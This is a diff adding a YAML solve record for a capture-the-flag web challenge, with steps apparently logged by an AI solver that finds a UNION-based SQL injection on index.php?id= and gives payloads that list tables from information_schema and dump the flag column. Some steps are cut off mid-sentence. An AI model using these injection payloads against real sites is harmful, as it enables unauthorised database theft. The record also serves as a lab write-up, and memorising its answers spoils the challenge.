@@ -1,0 +1,34 @@
+name: SQL注入-1 3361ec5ddd02
+category: web
+keywords:
+- sql
+- ctfer
+- book
+- nu1l
+steps:
+- '[codex] Target is source-disclosing: `index.php?id=3&tips=1` prints `select * from
+  notes where id =''3''` — id is quoted single string, no filtering of spaces. Use
+  tips=1 to see every payload.'
+- '[codex] Full UNION injection on `index.php?id=`: `-1'' union select 1,group_concat(table_name),3
+  from information_schema.tables where table_schema=''note''-- -` → `fl4g,notes`;
+  table `fl4g` column `fllllag` hold'
+- '[codex] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+- '[codex] UNION SQLi on index.php?id= confirmed; GET /index.php?id=-1''%20union%20select%201,group_concat(fllllag),3%20from%20fl4g--%20-
+  returns the fl4g table contents (column fllllag) in the page header. Backg'
+- '{"observation_status":"UNAVAILABLE","tool":"http_request"}'
+evidence_chain:
+- '[codex] Target is source-disclosing: `index.php?id=3&tips=1` prints `select * from
+  notes where id =''3''` — id is quoted single string, no filtering of spaces. Use
+  tips=1 to see every payload.'
+- '[codex] Full UNION injection on `index.php?id=`: `-1'' union select 1,group_concat(table_name),3
+  from information_schema.tables where table_schema=''note''-- -` → `fl4g,notes`;
+  table `fl4g` column `fllllag` hold'
+- '[codex] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+- '[codex] UNION SQLi on index.php?id= confirmed; GET /index.php?id=-1''%20union%20select%201,group_concat(fllllag),3%20from%20fl4g--%20-
+  returns the fl4g table contents (column fllllag) in the page header. Backg'
+- '{"observation_status":"UNAVAILABLE","tool":"http_request"}'
+success_format: CTF2\{[^}]+\}
+source: 3361ec5d-dd02-4f27-af29-42d5dd4f1e13 (solver b00a5218-924e-47d8-8c38-aed367e95bc5)
+notes: ''
